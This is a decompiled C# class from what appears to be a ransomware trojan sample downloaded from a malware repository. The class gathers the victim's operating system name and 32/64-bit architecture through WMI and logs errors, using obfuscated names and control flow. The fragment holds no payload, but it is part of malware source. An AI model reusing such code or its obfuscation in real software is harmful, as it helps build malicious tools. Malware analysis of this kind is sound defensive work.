// Decompiled with JetBrains decompiler
// Type: SHNB83.Specifications.DatabaseAdapterSpec
// Assembly: SHNB83, Version=6.2.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B8ADEC2C-652C-4F1A-AD72-03917C70995A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2ff875c4fdfbf9f9644bc7ebc6c9532fc92e7bb9fa92aab2b1d3ecff09f9bb94.exe

using SHNB83.Listeners;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SHNB83.Specifications
{
  internal static class DatabaseAdapterSpec
  {
    private static DatabaseAdapterSpec PatchUtils;

    [CompilerGenerated]
    [SpecialName]
    internal static string RateExporter() => DatabaseAdapterSpec._Tokenizer;

    [CompilerGenerated]
    [SpecialName]
    internal static void InitExporter(string param) => DatabaseAdapterSpec._Tokenizer = param;

    internal static void QueryExporter()
    {
      List<Exception> exceptionList = new List<Exception>();
      try
      {
        DatabaseAdapterSpec.InitExporter(DatabaseAdapterSpec.PopExporter());
      }
      catch (Exception ex)
      {
        exceptionList.Add(ex);
      }
      finally
      {
        foreach (Exception exception in exceptionList)
          DatabaseAdapterSpec.MapUtils((object) exception.StackTrace);
      }
    }

    private static string PopExporter()
    {
      object obj = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>().Select<ManagementObject, object>((Func<ManagementObject, object>) (x => x.GetPropertyValue("Caption"))).FirstOrDefault<object>();
      string str;
      if (obj == null)
      {
        int num = 0;
        if (DatabaseAdapterSpec.CountUtils() == null)
          goto label_4;
label_1:
        switch (num)
        {
          default:
            str = "Unknown";
            goto label_6;
        }
label_4:
        num = 0;
        goto label_1;
      }
      else
        str = obj.ToString();
label_6:
      return str.Trim() + " " + (Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
    }

    internal static void MapUtils([In] object obj0) => Tag.FlushExporter((string) obj0);

    internal static bool CloneUtils() => DatabaseAdapterSpec.PatchUtils == null;

    internal static DatabaseAdapterSpec CountUtils() => DatabaseAdapterSpec.PatchUtils;
  }
}
